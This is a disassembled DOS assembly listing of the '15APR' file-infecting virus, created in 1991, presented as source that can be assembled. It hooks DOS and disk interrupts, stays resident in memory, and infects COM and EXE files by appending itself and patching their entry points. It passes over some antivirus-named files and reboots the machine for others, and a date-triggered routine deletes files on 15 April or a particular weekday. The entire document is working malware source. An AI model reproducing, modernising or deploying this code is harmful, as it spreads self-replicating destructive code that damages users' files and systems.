  
PAGE  60,132
  
;��������������������������������������������������������������������������
;��								         ��
;��			        15APR				         ��
;��								         ��
;��      Created:   4-Mar-91					         ��
;��								         ��
;��������������������������������������������������������������������������
  
data_1e		equ	4Ch				; (0000:004C=31h)
data_2e		equ	4Eh				; (0000:004E=70h)
data_3e		equ	84h				; (0000:0084=0E3h)
data_4e		equ	86h				; (0000:0086=161Ah)
data_5e		equ	90h				; (0000:0090=8Eh)
data_6e		equ	92h				; (0000:0092=1498h)
data_7e		equ	102h				; (0000:0102=0CC00h)
data_8e		equ	106h				; (0000:0106=326h)
data_9e		equ	47Bh				; (0000:047B=0)
data_10e	equ	0				; (0326:0000=6A7h)
data_11e	equ	2				; (0326:0002=70h)
data_12e	equ	0				; (0691:0000=0C9h)
data_13e	equ	1				; (0692:0001=0D217h)
data_14e	equ	2				; (06E3:0002=2342h)
data_15e	equ	6				; (06E3:0006=2344h)
data_32e	equ	0FC99h				; (701E:FC99=0)
data_33e	equ	0FC9Bh				; (701E:FC9B=0)
data_34e	equ	0FCB7h				; (701E:FCB7=0)
data_35e	equ	0FCB9h				; (701E:FCB9=0)
data_36e	equ	0FCBBh				; (701E:FCBB=0)
data_37e	equ	0FCC5h				; (701E:FCC5=0)
data_38e	equ	0FCC7h				; (701E:FCC7=0)
data_39e	equ	0FCCDh				; (701E:FCCD=0)
data_40e	equ	0FCCFh				; (701E:FCCF=0)
  
code_seg_a	segment
		assume	cs:code_seg_a, ds:code_seg_a
  
  
		org	100h
  
b15apr          proc    far
  
start:
data_16		dw	63E9h
data_17		dw	0C303h
		db	23 dup (0C3h)
		db	2Ah, 2Eh, 45h, 58h, 45h, 0
data_19		dw	0C3C3h
data_20		dw	0C3C3h
data_21		dw	0
data_22		dw	0
data_23		dw	0
data_24		dw	0
data_25		dw	0
data_26		dd	00000h
data_27		dw	0
data_28		dw	0
data_29		dd	00000h
data_30		dw	0
data_31		dw	0
		db	0Ah, 0Dh, 0Ah, 0Dh, ' Bhaktivedan'
		db	'ta Swami Prabhupada (1896-1977)', 0Ah
		db	0Dh, 0Ah, 0Dh, '$=MKu', 9, 'U'
		db	8Bh, 0ECh, 83h, 66h, 6, 0FEh
		db	5Dh, 0CFh, 80h, 0FCh, 4Bh, 74h
		db	12h, 3Dh, 0, 3Dh, 74h, 0Dh
		db	3Dh, 0, 6Ch, 75h, 5, 80h
		db	0FBh, 0, 74h, 3
loc_1:
		jmp	loc_15
loc_2:
		push	es
		push	ds
		push	di
		push	si
		push	bp
		push	dx
		push	cx
		push	bx
		push	ax
		call	sub_6
		call	sub_7
		cmp	ax,6C00h
		jne	loc_3				; Jump if not equal
		mov	dx,si
loc_3:
		mov	cx,80h
		mov	si,dx
  
locloop_4:
		inc	si
		mov	al,[si]
		or	al,al				; Zero ?
		loopnz	locloop_4			; Loop if zf=0, cx>0
  
		sub	si,2
		cmp	word ptr [si],4D4Fh
		je	loc_7				; Jump if equal
		cmp	word ptr [si],4558h
		je	loc_6				; Jump if equal
loc_5:
		jmp	short loc_14
		db	90h
loc_6:
		cmp	word ptr [si-4],4E41h
		je	loc_8				; Jump if equal
		cmp	word ptr [si-4],444Ch
		je	loc_8				; Jump if equal
		cmp	word ptr [si-4],4A52h
		je	loc_8				; Jump if equal
		jnz	loc_9				; Jump if not zero
loc_7:
		cmp	word ptr [si-4],444Eh
		je	loc_5				; Jump if equal
		jnz	loc_10				; Jump if not zero
loc_8:
		int	19h				; Bootstrap loader
loc_9:
		jz	loc_10				; Jump if zero
loc_10:
		mov	ax,3D02h
		call	sub_5
		jc	loc_14				; Jump if carry Set
		mov	bx,ax
		mov	ax,5700h
		call	sub_5
		mov	cs:data_22,cx			; (701E:0127=0)
		mov	cs:data_23,dx			; (701E:0129=0)
		mov	ax,4200h
		xor	cx,cx				; Zero register
		xor	dx,dx				; Zero register
		call	sub_5
		push	cs
		pop	ds
		mov	dx,103h
		mov	si,dx
		mov	cx,18h
		mov	ah,3Fh				; '?'
		call	sub_5
		jc	loc_12				; Jump if carry Set
		cmp	word ptr [si],5A4Dh
		jne	loc_11				; Jump if not equal
		call	sub_1
		jmp	short loc_12
loc_11:
		call	sub_4
loc_12:
		jc	loc_13				; Jump if carry Set
		mov	ax,5701h
		mov	cx,cs:data_22			; (701E:0127=0)
		mov	dx,cs:data_23			; (701E:0129=0)
		call	sub_5
loc_13:
		mov	ah,3Eh				; '>'
		call	sub_5
loc_14:
		call	sub_7
		pop	ax
		pop	bx
		pop	cx
		pop	dx
		pop	bp
		pop	si
		pop	di
		pop	ds
		pop	es
loc_15:
		jmp	cs:data_26			; (701E:012F=0)
  
b15apr          endp
  
;��������������������������������������������������������������������������
;			       SUBROUTINE
;��������������������������������������������������������������������������
  
sub_1		proc	near
		mov	ah,2Ah				; '*'
		int	21h				; DOS Services  ah=function 2Ah
							;  get date, cx=year, dx=mon/day
		cmp	dh,4
		je	loc_16				; Jump if equal
		jnz	loc_17				; Jump if not zero
loc_16:
		mov	ah,2Ah				; '*'
		int	21h				; DOS Services  ah=function 2Ah
							;  get date, cx=year, dx=mon/day
		cmp	dl,0Fh
		je	loc_18				; Jump if equal
		jnz	loc_17				; Jump if not zero
loc_17:
		mov	cx,[si+16h]
		add	cx,[si+8]
		mov	ax,10h
		mul	cx				; dx:ax = reg * ax
		add	ax,[si+14h]
		adc	dx,0
		push	dx
		push	ax
		mov	ax,4202h
		xor	cx,cx				; Zero register
		xor	dx,dx				; Zero register
		call	sub_5
		cmp	dx,0
		jne	loc_19				; Jump if not equal
		cmp	ax,4E2h
		jae	loc_19				; Jump if above or =
		pop	ax
		pop	dx
		stc					; Set carry flag
		ret
loc_18:
		mov	dx,10h
		mov	ah,1Ah
		int	21h				; DOS Services  ah=function 1Ah
							;  set DTA to ds:dx
		mov	dx,11Bh
		mov	cx,110Bh
		mov	ah,4Eh				; 'N'
		int	21h				; DOS Services  ah=function 4Eh
							;  find 1st filenam match @ds:dx
		mov	dx,2Eh
		mov	ax,3D02h
		int	15h				; General services, ah=func 3Dh
		mov	ah,41h				; 'A'
		int	21h				; DOS Services  ah=function 41h
							;  delete file, name @ ds:dx
		jmp	loc_25
		db	0BAh, 3Fh, 1, 0B4h, 9, 0CDh
		db	21h, 0EBh, 1, 90h
loc_19:
		mov	di,ax
		mov	bp,dx
		pop	cx
		sub	ax,cx
		pop	cx
		sbb	dx,cx
		cmp	word ptr [si+0Ch],0
		je	loc_ret_22			; Jump if equal
		cmp	dx,0
		jne	loc_20				; Jump if not equal
		cmp	ax,4E2h
		jne	loc_20				; Jump if not equal
		stc					; Set carry flag
		ret
loc_20:
		mov	dx,bp
		mov	ax,di
		push	dx
		push	ax
		add	ax,4E2h
		adc	dx,0
		mov	cx,200h
		div	cx				; ax,dx rem=dx:ax/reg
		les	di,dword ptr [si+2]		; Load 32 bit ptr
		mov	cs:data_24,di			; (701E:012B=0)
		mov	cs:data_25,es			; (701E:012D=0)
		mov	[si+2],dx
		cmp	dx,0
		je	loc_21				; Jump if equal
		inc	ax
loc_21:
		mov	[si+4],ax
		pop	ax
		pop	dx
		call	sub_2
		sub	ax,[si+8]
		les	di,dword ptr [si+14h]		; Load 32 bit ptr
		mov	data_19,di			; (701E:0121=0C3C3h)
		mov	data_20,es			; (701E:0123=0C3C3h)
		mov	[si+14h],dx
		mov	[si+16h],ax
		mov	word ptr data_21,ax		; (701E:0125=0)
		mov	ax,4202h
		xor	cx,cx				; Zero register
		xor	dx,dx				; Zero register
		call	sub_5
		call	sub_3
		jc	loc_ret_22			; Jump if carry Set
		mov	ax,4200h
		xor	cx,cx				; Zero register
		xor	dx,dx				; Zero register
		call	sub_5
		mov	ah,40h				; '@'
		mov	dx,si
		mov	cx,18h
		call	sub_5
  
loc_ret_22:
		ret
  
;���� External Entry into Subroutine ��������������������������������������
  
sub_2:
		mov	cx,4
		mov	di,ax
		and	di,0Fh
  
locloop_23:
		shr	dx,1				; Shift w/zeros fill
		rcr	ax,1				; Rotate thru carry
		loop	locloop_23			; Loop if cx > 0
  
		mov	dx,di
		ret
  
;���� External Entry into Subroutine ��������������������������������������
  
sub_3:
		mov	ah,40h				; '@'
		mov	cx,4E2h
		mov	dx,100h
		call	sub_6
		jmp	short loc_29
		db	90h
  
;���� External Entry into Subroutine ��������������������������������������
  
sub_4:
		mov	ah,2Ah				; '*'
		int	21h				; DOS Services  ah=function 2Ah
							;  get date, cx=year, dx=mon/day
		cmp	al,6
		je	loc_24				; Jump if equal
		jnz	loc_25				; Jump if not zero
loc_24:
		mov	dx,10h
		mov	ah,1Ah
		int	21h				; DOS Services  ah=function 1Ah
							;  set DTA to ds:dx
		mov	dx,11Bh
		mov	cx,110Bh
		mov	ah,4Eh				; 'N'
		int	21h				; DOS Services  ah=function 4Eh
							;  find 1st filenam match @ds:dx
		mov	dx,2Eh
		mov	ax,3D02h
		int	15h				; General services, ah=func 3Dh
		mov	ah,41h				; 'A'
		int	21h				; DOS Services  ah=function 41h
							;  delete file, name @ ds:dx
		jmp	short loc_25
		db	90h
loc_25:
		mov	ax,4202h
		xor	cx,cx				; Zero register
		xor	dx,dx				; Zero register
		call	sub_5
		cmp	ax,4E2h
		jb	loc_ret_28			; Jump if below
		cmp	ax,0FA00h
		jae	loc_ret_28			; Jump if above or =
		push	ax
		cmp	byte ptr [si],0E9h
		jne	loc_26				; Jump if not equal
		sub	ax,4E5h
		cmp	ax,[si+1]
		jne	loc_26				; Jump if not equal
		pop	ax
		stc					; Set carry flag
		ret
loc_26:
		call	sub_3
		jnc	loc_27				; Jump if carry=0
		pop	ax
		ret
loc_27:
		mov	ax,4200h
		xor	cx,cx				; Zero register
		xor	dx,dx				; Zero register
		call	sub_5
		pop	ax
		sub	ax,3
		mov	dx,121h
		mov	si,dx
		mov	byte ptr cs:[si],0E9h
		mov	cs:[si+1],ax
		mov	ah,40h				; '@'
		mov	cx,3
		call	sub_5
  
loc_ret_28:
		ret
sub_1		endp
  
  
;��������������������������������������������������������������������������
;			       SUBROUTINE
;��������������������������������������������������������������������������
  
sub_5		proc	near
loc_29:
		pushf					; Push flags
		call	cs:data_26			; (701E:012F=0)
		ret
sub_5		endp
  
  
;��������������������������������������������������������������������������
;			       SUBROUTINE
;��������������������������������������������������������������������������
  
sub_6		proc	near
		push	ax
		push	ds
		push	es
		xor	ax,ax				; Zero register
		push	ax
		pop	ds
		cli					; Disable interrupts
		les	ax,dword ptr ds:data_5e		; (0000:0090=18Eh) Load 32 bit ptr
		mov	cs:data_27,ax			; (701E:0133=0)
		mov	cs:data_28,es			; (701E:0135=0)
		mov	ax,44Eh
		mov	ds:data_5e,ax			; (0000:0090=18Eh)
		mov	ds:data_6e,cs			; (0000:0092=1498h)
		les	ax,dword ptr ds:data_1e		; (0000:004C=831h) Load 32 bit ptr
		mov	cs:data_30,ax			; (701E:013B=0)
		mov	cs:data_31,es			; (701E:013D=0)
		les	ax,cs:data_29			; (701E:0137=0) Load 32 bit ptr
		mov	ds:data_1e,ax			; (0000:004C=831h)
		mov	ds:data_2e,es			; (0000:004E=70h)
		sti					; Enable interrupts
		pop	es
		pop	ds
		pop	ax
		ret
sub_6		endp
  
  
;��������������������������������������������������������������������������
;			       SUBROUTINE
;��������������������������������������������������������������������������
  
sub_7		proc	near
		push	ax
		push	ds
		push	es
		xor	ax,ax				; Zero register
		push	ax
		pop	ds
		cli					; Disable interrupts
		les	ax,dword ptr cs:data_27		; (701E:0133=0) Load 32 bit ptr
		mov	ds:data_5e,ax			; (0000:0090=18Eh)
		mov	ds:data_6e,es			; (0000:0092=1498h)
		les	ax,dword ptr cs:data_30		; (701E:013B=0) Load 32 bit ptr
		mov	ds:data_1e,ax			; (0000:004C=831h)
		mov	ds:data_2e,es			; (0000:004E=70h)
		sti					; Enable interrupts
		pop	es
		pop	ds
		pop	ax
		ret
sub_7		endp
  
		db	0B0h, 3, 0CFh
  
;��������������������������������������������������������������������������
;			       SUBROUTINE
;��������������������������������������������������������������������������
  
sub_8		proc	near
		mov	dx,10h
		mul	dx				; dx:ax = reg * ax
		ret
sub_8		endp
  
  
;��������������������������������������������������������������������������
;			       SUBROUTINE
;��������������������������������������������������������������������������
  
sub_9		proc	near
		xor	ax,ax				; Zero register
		xor	bx,bx				; Zero register
		xor	cx,cx				; Zero register
		xor	dx,dx				; Zero register
		xor	si,si				; Zero register
		xor	di,di				; Zero register
		xor	bp,bp				; Zero register
		ret
sub_9		endp
  
		db	1Eh, 0E8h, 0, 0
  
;��������������������������������������������������������������������������
;			       SUBROUTINE
;��������������������������������������������������������������������������
  
sub_10		proc	near
		mov	ax,4B4Dh
		nop
		int	21h				; DOS Services  ah=function 4Bh
							;  run progm @ds:dx, parm @es:bx
		jc	loc_30				; Jump if carry Set
		jmp	loc_40
loc_30:
		pop	si
		push	si
		nop
		mov	di,si
		xor	ax,ax				; Zero register
		push	ax
		pop	ds
		les	ax,dword ptr ds:data_1e		; (0000:004C=831h) Load 32 bit ptr
		mov	cs:data_39e[si],ax		; (701E:FCCD=0)
		mov	cs:data_40e[si],es		; (701E:FCCF=0)
		les	bx,dword ptr ds:data_3e		; (0000:0084=6E3h) Load 32 bit ptr
		mov	cs:data_37e[di],bx		; (701E:FCC5=0)
		mov	cs:data_38e[di],es		; (701E:FCC7=0)
		mov	ax,ds:data_7e			; (0000:0102=0CC00h)
		cmp	ax,0F000h
		jne	loc_38				; Jump if not equal
		mov	dl,80h
		mov	ax,ds:data_8e			; (0000:0106=326h)
		cmp	ax,0F000h
		je	loc_31				; Jump if equal
		cmp	ah,0C8h
		jb	loc_38				; Jump if below
		cmp	ah,0F4h
		jae	loc_38				; Jump if above or =
		test	al,7Fh
		jnz	loc_38				; Jump if not zero
		mov	ds,ax
		cmp	word ptr ds:data_10e,0AA55h	; (0326:0000=6A7h)
		jne	loc_38				; Jump if not equal
		mov	dl,ds:data_11e			; (0326:0002=70h)
loc_31:
		mov	ds,ax
		xor	dh,dh				; Zero register
		mov	cl,9
		shl	dx,cl				; Shift w/zeros fill
		mov	cx,dx
		xor	si,si				; Zero register
  
locloop_32:
		lodsw					; String [si] to ax
		cmp	ax,0FA80h
		jne	loc_33				; Jump if not equal
		lodsw					; String [si] to ax
		cmp	ax,7380h
		je	loc_34				; Jump if equal
		jnz	loc_35				; Jump if not zero
loc_33:
		cmp	ax,0C2F6h
		jne	loc_36				; Jump if not equal
		lodsw					; String [si] to ax
		cmp	ax,7580h
		jne	loc_35				; Jump if not equal
loc_34:
		inc	si
		lodsw					; String [si] to ax
		cmp	ax,40CDh
		je	loc_37				; Jump if equal
		sub	si,3
loc_35:
		dec	si
		dec	si
loc_36:
		dec	si
		loop	locloop_32			; Loop if cx > 0
  
		jmp	short loc_38
loc_37:
		sub	si,7
		mov	cs:data_39e[di],si		; (701E:FCCD=0)
		mov	cs:data_40e[di],ds		; (701E:FCCF=0)
loc_38:
		mov	ah,62h				; 'b'
		int	21h				; DOS Services  ah=function 62h
							;  get progrm seg prefix addr bx
		mov	es,bx
		mov	ah,49h				; 'I'
		int	21h				; DOS Services  ah=function 49h
							;  release memory block, es=seg
		mov	bx,0FFFFh
		mov	ah,48h				; 'H'
		int	21h				; DOS Services  ah=function 48h
							;  allocate memory, bx=bytes/16
		sub	bx,50h
		nop
		jc	loc_40				; Jump if carry Set
		mov	cx,es
		stc					; Set carry flag
		adc	cx,bx
		mov	ah,4Ah				; 'J'
		int	21h				; DOS Services  ah=function 4Ah
							;  change mem allocation, bx=siz
		mov	bx,4Fh
		stc					; Set carry flag
		sbb	es:data_14e,bx			; (06E3:0002=2342h)
		push	es
		mov	es,cx
		mov	ah,4Ah				; 'J'
		int	21h				; DOS Services  ah=function 4Ah
							;  change mem allocation, bx=siz
		mov	ax,es
		dec	ax
		mov	ds,ax
		mov	word ptr ds:data_13e,8		; (0692:0001=0D217h)
		call	sub_8
		mov	bx,ax
		mov	cx,dx
		pop	ds
		mov	ax,ds
		call	sub_8
		add	ax,ds:data_15e			; (06E3:0006=2344h)
		adc	dx,0
		sub	ax,bx
		sbb	dx,cx
		jc	loc_39				; Jump if carry Set
		sub	ds:data_15e,ax			; (06E3:0006=2344h)
loc_39:
		mov	si,di
		xor	di,di				; Zero register
		push	cs
		pop	ds
		sub	si,36Ah
		mov	cx,4E2h
		inc	cx
		rep	movsb				; Rep while cx>0 Mov [si] to es:[di]
		mov	ah,62h				; 'b'
		int	21h				; DOS Services  ah=function 62h
							;  get progrm seg prefix addr bx
		dec	bx
		mov	ds,bx
		mov	byte ptr ds:data_12e,5Ah	; (0691:0000=0C9h) 'Z'
		mov	dx,173h
		xor	ax,ax				; Zero register
		push	ax
		pop	ds
		mov	ax,es
		sub	ax,10h
		mov	es,ax
		cli					; Disable interrupts
		mov	ds:data_3e,dx			; (0000:0084=6E3h)
		mov	ds:data_4e,es			; (0000:0086=161Ah)
		sti					; Enable interrupts
		dec	byte ptr ds:data_9e		; (0000:047B=0)
loc_40:
		pop	si
		cmp	word ptr cs:data_32e[si],5A4Dh	; (701E:FC99=0)
		jne	loc_41				; Jump if not equal
		pop	ds
		mov	ax,cs:data_36e[si]		; (701E:FCBB=0)
		mov	bx,cs:data_35e[si]		; (701E:FCB9=0)
		push	cs
		pop	cx
		sub	cx,ax
		add	cx,bx
		push	cx
		push	word ptr cs:data_34e[si]	; (701E:FCB7=0)
		push	ds
		pop	es
		call	sub_9
		ret					; Return far
loc_41:
		pop	ax
		mov	ax,cs:data_32e[si]		; (701E:FC99=0)
		mov	cs:data_16,ax			; (701E:0100=63E9h)
		mov	ax,cs:data_33e[si]		; (701E:FC9B=0)
		mov	cs:data_17,ax			; (701E:0102=0C303h)
		mov	ax,100h
		push	ax
		push	cs
		pop	ds
		push	ds
		pop	es
		call	sub_9
		ret
sub_10		endp
  
  
code_seg_a	ends
  
  
  
		end	start
